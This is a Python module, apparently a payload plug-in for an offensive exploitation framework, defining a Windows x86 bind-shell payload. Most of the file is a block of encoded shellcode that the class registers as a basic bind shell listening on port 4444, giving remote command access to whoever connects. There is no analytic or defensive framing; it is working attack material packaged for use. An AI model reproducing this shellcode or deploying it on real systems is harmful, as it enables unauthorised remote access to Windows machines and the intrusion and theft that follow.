import typing
from core import payloadcore
from shells import shellsindex


class BindWindowsx86(payloadcore.Payload):
    AUTHOR: str = "Danakane"
    PAYLOAD: bytes = b"\x6a\x52\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13" \
                     b"\x85\xdd\x9b\xf7\x83\xeb\xfc\xe2\xf4\x79\x35\x19\xf7" \
                     b"\x85\xdd\xfb\x7e\x60\xec\x5b\x93\x0e\x8d\xab\x7c\xd7" \
                     b"\xd1\x10\xa5\x91\x56\xe9\xdf\x8a\x6a\xd1\xd1\xb4\x22" \
                     b"\x37\xcb\xe4\xa1\x99\xdb\xa5\x1c\x54\xfa\x84\x1a\x79" \
                     b"\x05\xd7\x8a\x10\xa5\x95\x56\xd1\xcb\x0e\x91\x8a\x8f" \
                     b"\x66\x95\x9a\x26\xd4\x56\xc2\xd7\x84\x0e\x10\xbe\x9d" \
                     b"\x3e\xa1\xbe\x0e\xe9\x10\xf6\x53\xec\x64\x5b\x44\x12" \
                     b"\x96\xf6\x42\xe5\x7b\x82\x73\xde\xe6\x0f\xbe\xa0\xbf" \
                     b"\x82\x61\x85\x10\xaf\xa1\xdc\x48\x91\x0e\xd1\xd0\x7c" \
                     b"\xdd\xc1\x9a\x24\x0e\xd9\x10\xf6\x55\x54\xdf\xd3\xa1" \
                     b"\x86\xc0\x96\xdc\x87\xca\x08\x65\x82\xc4\xad\x0e\xcf" \
                     b"\x70\x7a\xd8\xb5\xa8\xc5\x85\xdd\xf3\x80\xf6\xef\xc4" \
                     b"\xa3\xed\x91\xec\xd1\x82\x22\x4e\x4f\x15\xdc\x9b\xf7" \
                     b"\xac\x19\xcf\xa7\xed\xf4\x1b\x9c\x85\x22\x4e\x9d\x8d" \
                     b"\x84\xcb\x15\x78\x9d\xcb\xb7\xd5\xb5\x71\xf8\x5a\x3d" \
                     b"\x64\x22\x12\xb5\x99\xf7\x94\x81\x12\x11\xef\xcd\xcd" \
                     b"\xa0\xed\x1f\x40\xc0\xe2\x22\x4e\xa0\xed\x6a\x72\xcf" \
                     b"\x7a\x22\x4e\xa0\xed\xa9\x77\xcc\x64\x22\x4e\xa0\x12" \
                     b"\xb5\xee\x99\xc8\xbc\x64\x22\xed\xbe\xf6\x93\x85\x54" \
                     b"\x78\xa0\xd2\x8a\xaa\x01\xef\xcf\xc2\xa1\x67\x20\xfd" \
                     b"\x30\xc1\xf9\xa7\xf6\x84\x50\xdf\xd3\x95\x1b\x9b\xb3" \
                     b"\xd1\x8d\xcd\xa1\xd3\x9b\xcd\xb9\xd3\x8b\xc8\xa1\xed" \
                     b"\xa4\x57\xc8\x03\x22\x4e\x7e\x65\x93\xcd\xb1\x7a\xed" \
                     b"\xf3\xff\x02\xc0\xfb\x08\x50\x66\x6b\x42\x27\x8b\xf3" \
                     b"\x51\x10\x60\x06\x08\x50\xe1\x9d\x8b\x8f\x5d\x60\x17" \
                     b"\xf0\xd8\x20\xb0\x96\xaf\xf4\x9d\x85\x8e\x64\x22"

    def __init__(self):
        super(BindWindowsx86, self).__init__()
        self.customize(BindWindowsx86.PAYLOAD, shellsindex.ShellsIndex.basicbind, {})

    @property
    def bindport(self) -> int:  # 4444 = bind port
        return 4444


blueprint: typing.Callable = BindWindowsx86
